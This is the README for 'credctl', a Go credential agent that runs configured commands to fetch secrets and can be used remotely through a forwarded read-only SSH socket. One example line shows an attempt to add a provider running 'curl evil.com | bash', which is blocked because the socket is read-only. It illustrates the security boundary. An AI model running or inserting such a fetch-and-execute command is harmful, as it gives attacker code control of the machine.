# credctl

A tiny SSH-forwardable credential agent for Unix systems (macOS/Linux).

## Overview

`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files), interactive login flows, and provides secure remote access via SSH socket forwarding.

## Installation

### Using Make (recommended)

```bash
make install
```

This will build and install `credctl` to `$(go env GOPATH)/bin` (usually `~/go/bin`).

Make sure `$(go env GOPATH)/bin` is in your PATH:
```bash
# Add to ~/.bashrc, ~/.zshrc, or equivalent
export PATH="$(go env GOPATH)/bin:$PATH"
```

You can customize the installation directory:

```bash
# Install to /usr/local/bin instead
make install PREFIX=/usr/local

# Install to ~/.local/bin
make install PREFIX=~/.local

# Just build without installing
make build
```

### Manual installation

```bash
go build -o credctl
mv credctl $(go env GOPATH)/bin/
# or
sudo mv credctl /usr/local/bin/
```

### Uninstall

```bash
make uninstall
```

## Quick Start

### 1. Start the daemon

```bash
eval $(credctl daemon)
```

This exports `CREDCTL_SOCK`, `CREDCTL_PID`, and `CREDCTL_LOGS` environment variables.

### 2. Add credential providers

```bash
# GitHub token with interactive login
credctl add command gh --command "gh auth token" \
  --login_command "gh auth login --web --clipboard -p https" \
  --run-login
```

### 3. Get credentials

```bash
credctl get gh              # Raw output
```

### 4. Re-authenticate when needed

```bash
# Run login command for a provider
credctl login gh            # Executes: gh auth login --web --clipboard -p https
```

### 5. Export/Import providers

```bash
# Export all providers to JSON
credctl export > providers.json

# Import providers from file or stdin
credctl import providers.json
curl https://company.com/providers.json | credctl import

# Overwrite existing providers
credctl import --overwrite providers.json
```

## Remote Usage with SSH

The daemon creates two sockets:
- **Admin socket**: Full access (add, get, delete)
- **Read-only socket**: Only get operations

### Setup for SSH forwarding

**1. On your local machine (macOS):**

```bash
# Build credctl for the remote server architecture
make build-linux-amd64    # For Linux x86_64
# or
make build-linux-arm64    # For Linux ARM64

# Copy binary to remote server
scp credctl_linux_amd64 user@remote:/tmp/credctl
```

**2. SSH with socket forwarding:**

```bash
# forward the read-only socket (safer - only get operations)
ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@remote
```

**3. On remote host:**

```bash
export CREDCTL_SOCK=/tmp/credctl.sock

# Get credentials
/tmp/credctl get gh        # ✓ Works

# If using read-only socket, modifications are blocked
/tmp/credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
```

### Cross-compilation targets

```bash
make build-linux-amd64     # Linux x86_64
make build-linux-arm64     # Linux ARM64  
make build-darwin-amd64    # macOS Intel
make build-darwin-arm64    # macOS Apple Silicon
make build-all             # Build for all platforms
```

By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.

## Viewing Logs

```bash
# View logs in real-time
tail -f $CREDCTL_LOGS

# Search for errors
grep error $CREDCTL_LOGS
```